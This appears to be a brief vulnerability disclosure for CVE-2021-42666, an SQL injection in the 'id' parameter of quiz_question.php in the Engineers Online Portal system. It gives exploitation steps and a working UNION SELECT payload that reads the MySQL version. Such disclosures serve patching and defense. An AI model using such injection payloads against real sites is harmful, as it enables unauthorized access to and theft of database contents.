# CVE-2021-42666
CVE-2021-42666 - SQL Injection vulnerability in the Engineers online portal system. 

# Technical description:
An SQL Injection vulnerability exists in the Engineers Online Portal system. An attacker can leverage the vulnerable "id" parameter in the "quiz_question.php" web page in order to manipulate the sql query performed.
As a result he can extract sensitive data from the web server.

Affected components - 

Vulnerable page - quiz_question.php

Vulnerable parameter - "id"

# Steps to exploit:
1) Navigate to http://localhost/nia_munoz_monitoring_system/quiz_question.php
2) Insert your payload in the id parameter

# Proof of concept (Poc) -
The following payload will allow you to extract the MySql server version running on the web server -
```
' union select NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL;-- -
```

![CVE-2021-42666](https://user-images.githubusercontent.com/93016131/140187597-c512a30d-4dba-45d0-91d2-fd06d3afdafa.gif)

# References - 
https://www.exploit-db.com/exploits/50453

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42666

https://nvd.nist.gov/vuln/detail/CVE-2021-42666

# Discovered by - 
Alon Leviev(0xDeku), 22 October, 2021. 
